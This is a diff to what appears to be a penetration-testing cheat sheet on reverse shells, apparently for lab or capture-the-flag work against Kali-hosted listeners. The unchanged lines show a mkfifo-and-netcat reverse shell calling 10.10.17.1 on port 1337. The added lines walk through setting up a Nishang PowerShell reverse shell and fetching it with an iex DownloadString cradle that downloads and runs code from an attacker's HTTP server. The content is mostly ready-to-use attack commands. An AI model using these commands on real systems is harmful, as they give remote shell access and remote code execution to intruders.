@@ -53,6 +53,10 @@ exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`
 
 ## Powershell reverse shell
+`cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .`, `nano Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>` to the bottom of the file. Then, run a python http server on your current folder and `iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<http server port>/Invoke-PowerShellTcp.ps1")`. This method is best because it can show error messages like permission denied.
+
+or
+
 [encode.py](/docs/appendix/encode-py)
 
 or
